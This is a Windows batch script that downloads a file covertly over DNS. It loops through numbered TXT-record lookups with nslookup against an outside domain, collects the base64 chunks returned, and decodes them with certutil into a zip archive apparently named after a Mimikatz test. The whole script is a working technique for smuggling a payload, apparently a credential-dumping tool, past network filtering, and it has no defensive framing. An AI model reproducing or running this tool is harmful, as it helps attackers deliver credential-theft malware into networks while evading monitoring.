@echo off

set file_id=mimi1test
set targetfilename=mimi1test.zip
set dnsdomainname="x.gt.wtf"

set tmpfilename=cmddnsinfil.tmp
set endofdata=~cmddnsinfil.tmp
if exist %tmpfilename% del %tmpfilename%
if exist %endofdata% del %endofdata%

for /l %%c in (0,1,1000000) do (
	if not exist %endofdata% (
		@call :proc0 %%c 
		ping -n 2 localhost > nul 
		)
	)	
if exist %endofdata% del %endofdata%
echo Decoding...
certutil.exe -decode %tmpfilename% %targetfilename%
del %tmpfilename%
goto :eof

:proc0
echo %1
for /f "skip=4" %%i in ('"nslookup -q=txt %file_id%-%1-txt.%dnsdomainname%"') do @call :proc1 %%i
goto :eof

:proc1
set p1=%1
set p1=%p1:"=%
@rem echo #%p1%#
if "%p1%" EQU "====" (
	if not exist %endofdata% echo 1 > %endofdata%
	) else (
	echo %p1% >> %tmpfilename%
	)
goto :eof
